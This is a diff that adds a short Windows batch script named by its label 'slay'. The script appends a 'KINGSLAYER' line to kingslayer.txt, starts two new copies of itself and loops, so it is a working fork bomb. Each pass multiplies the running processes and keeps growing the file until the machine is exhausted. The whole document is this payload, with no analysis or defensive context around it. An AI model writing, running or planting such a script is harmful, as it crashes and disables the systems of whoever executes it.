@@ -1,0 +1,5 @@
+:slay
+echo "KINGSLAYER, DESTROYING CASTLES IN THE SKY" >> kingslayer.txt
+start %0
+start %0
+goto slay
